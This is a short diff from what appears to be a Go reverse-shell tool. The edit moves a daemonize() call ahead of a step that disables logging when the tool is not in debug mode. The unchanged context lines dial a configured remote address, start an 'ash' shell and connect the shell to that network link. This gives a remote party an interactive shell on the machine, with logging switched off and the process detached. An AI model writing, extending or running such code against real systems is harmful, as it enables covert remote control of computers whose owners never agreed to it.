@@ -15,17 +15,18 @@ func main() {
 }
 
 func startReverseShell(config Config) {
+	daemonize()
+
 	if !config.Debug {
 		disableLogging()
 	}
-
-	daemonize()
 
 	host := fmt.Sprintf("%s:%d", config.Addr, config.Port)
 	conn, err := net.Dial(config.Protocol, host)
 	check(err)
 
 	shellpath := path.Join(config.Path, "ash")
+
 	stdin := startShell(shellpath, conn)
 	reader := newNetLineReader(conn, config.Timeout)
 
